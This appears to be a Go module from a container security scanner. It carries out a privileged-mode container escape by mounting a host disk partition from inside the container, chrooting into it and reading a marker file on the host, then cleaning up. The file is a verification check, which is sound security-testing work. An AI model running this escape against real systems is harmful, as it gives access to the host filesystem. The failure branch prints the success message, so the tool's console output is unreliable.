package exp

import (
	"Container_runtime_scanner/internal/data"
	"Container_runtime_scanner/internal/docker"
	"fmt"
	"log"
	"regexp"
	"strconv"
)

func Exploit_pri(logger *log.Logger, cont *docker.Container) {
	logger.Println("Privileage特权模式逃逸")
	cont.ShExecStep("mkdir /test1")
	intermediate := cont.ShExecStep("ls /dev/sda*")
	idx := extractMaxNumber(intermediate)
	cont.ShExecStep("mount /dev/sda" + idx + " /test1")
	response := cont.ShExecStep("chroot /test1 /bin/sh -c 'cat ../../../../tmp/Container_runtime_scanner'")
	fmt.Println(response)

	if data.RegexGetBool("Container_runtime_scanner_123456", response) {
		logger.Println("验证漏洞成功，并成功逃逸")
		fmt.Println("验证漏洞成功，并成功逃逸")
	} else {
		logger.Println("逃逸失败")
		fmt.Println("验证漏洞成功，并成功逃逸")
	}

	logger.Println("删除测试记录")
	cont.ShExecStep("umount -f /test1")
	cont.ShExecStep("rm -r /test1")
	logger.Println("----------------------")

}
func extractMaxNumber(output string) string {
	re := regexp.MustCompile(`sda(\d+)`)
	matches := re.FindAllStringSubmatch(output, -1)
	max_1 := -1
	for _, match := range matches {
		if num, err := strconv.Atoi(match[1]); err == nil && num > max_1 {
			max_1 = num
		}
	}
	return strconv.Itoa(max_1)
}
